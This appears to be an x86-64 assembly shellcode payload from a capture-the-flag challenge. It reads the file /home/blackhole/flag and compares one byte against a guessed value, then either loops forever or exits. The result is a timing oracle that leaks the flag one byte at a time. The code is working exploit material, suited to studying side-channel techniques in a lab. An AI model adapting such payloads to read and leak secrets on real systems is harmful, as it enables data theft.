[bits 64]
[org 0x601d00]

index:
  times 0x08 db 0xff

estimated_flag:
  times 0x40 db 0xff

entry_point:
open_flag:
  mov rdi, flag_path
  mov rsi, 0
  mov rax, 2
  syscall

read_flag:
  mov rdi, rax
  mov rsi, buf
  mov rdx, 0x40
  mov rax, 0
  syscall

compare_flag:
  xor rcx, rcx
  mov rax, [index]
  mov cl, [buf+rax]
  mov al, [estimated_flag+rax]
  cmp al, cl
  jl infinite
  jmp call_exit

call_exit:
  mov rax, 60
  mov rdi, 0
  syscall

infinite:
  jmp infinite


flag_path:
  db '/home/blackhole/flag', 0

buf:
  times 0x40 db 0xff
